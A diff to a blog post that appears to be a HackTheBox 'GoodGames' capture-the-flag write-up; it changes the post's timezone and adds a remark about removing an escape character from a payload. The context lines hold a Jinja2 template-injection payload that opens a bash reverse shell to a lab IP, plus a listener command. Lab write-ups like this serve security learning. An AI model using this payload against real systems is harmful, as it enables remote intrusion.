@@ -3,7 +3,7 @@ title: HackTheBox - GoodGames
 author:
   name: wonderchild
   link: https://twitter.com/vonderchild
-date: 2022-04-05 4:40:00 +0000
+date: 2022-04-05 4:40:00 +0700
 categories: [HTB]
 tags: [HTB, boot2root]
 ---
@@ -85,6 +85,8 @@ OR
 
 {\{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.16.3/4444 0>&1"').read() }}
 ```
+
+Make sure to remove the `\` in payload. I added it to escape character sequences in jekyll.
 
 ```bash
 **pwncat :4444**
